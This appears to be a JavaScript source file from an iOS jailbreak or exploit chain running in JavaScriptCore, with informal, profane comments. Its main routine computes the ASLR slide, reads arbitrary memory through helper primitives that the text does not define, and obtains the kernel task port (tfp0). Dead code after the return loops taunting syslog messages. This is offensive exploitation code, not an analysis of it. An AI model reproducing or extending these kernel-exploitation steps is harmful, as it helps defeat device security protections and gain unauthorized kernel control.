/*
 *  november 24th 2021
 *  [3:16 PM] spv: spice confuses the shit out of me, so i'm prolly not smart enough to implement it anyway
 *
 *  ohai
 */

var MAX_SLIDE = 0x3;
var MIN_SLIDE = 0x1;

var ARM_THREAD_STATE_COUNT = 0x11;
var ARM_THREAD_STATE = 0x1;
var LOG_SYSLOG = 0x28;

var PROT_READ = 0x1;
var PROT_WRITE = 0x2;
var PROT_EXEC = 0x4;

var MAP_PRIVATE = 0x2;
var MAP_ANON = 0x1000;

/*
 *  leftover shit from jsc_fun, used to be using `log`
 */
try {
	puts("we out here in jsc");
} catch (e) {
	/*
	 *  we don't have puts. :(
	 */

	puts = function (){};
}

function main() {
	/*
	 *  get slide and calculate slid base
	 *  remember, 32-bit *OS defaults to 0x4000 for the unslid base for exec's
	 * 
	 *  so, take the slide, shift it by 12 bits (aslr is calc'd by taking a
	 *  random byte and shifting it 12 bits, in this case the page size, 4096
	 *  (0x1000) bytes), and add it to the unslid base.
	 */

	slide = get_our_slide();
	base = 0x4000 + (slide << 12);
	slid = (slide << 12);

	init_sptr_heap();

	puts("we out here");
	puts("I came through a portal holding a 40 and a blunt. Do you really wanna test me right now?");

	printf("slide=0x%x\n", slide);
	printf("*(uint8_t*)base = 0x%x\n", read_u8(base));
	printf("*(uint16_t*)base = 0x%x\n", read_u16(base));
	printf("*(uint32_t*)base = 0x%x\n", read_u32(base));

	var tfp0 = get_kernel_task();

	printf("tfp0=%x\n", tfp0);

	return;

	var i = 0;
	while (true) {
		syslog(LOG_SYSLOG, "get rekt from jsc %d (slide=%x)\n", i, slide);
		sleep(0);
		i++;
	}

	printf("still alive\n");
};
